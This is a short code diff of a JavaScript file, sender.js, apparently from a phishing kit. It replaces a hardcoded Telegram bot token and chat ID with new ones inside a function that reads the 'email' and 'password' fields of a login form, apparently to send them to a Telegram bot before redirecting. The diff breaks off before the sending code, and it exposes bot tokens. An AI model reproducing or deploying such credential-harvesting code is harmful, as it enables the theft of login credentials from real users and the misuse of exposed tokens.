@@ -2,8 +2,8 @@ console.log("sender.js connected");
 function sendTelegramMessageAndRedirect() {
   //  other user API
 
-    const telegramBotToken = "6540267021:AAFNksqVOSP4jMjcI6mslosa6ToClVh7HHU"; // add the telegram token
-   const chatId = 2114904331; // add ths id from the web It's usually a number, not a string
+    const telegramBotToken = "7018256337:AAHX2iHAfXZLAbe8ZYjZfvwDV6EQfYqYX1Y"; // add the telegram token
+   const chatId = 7002450305; // add ths id from the web It's usually a number, not a string
   
 const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
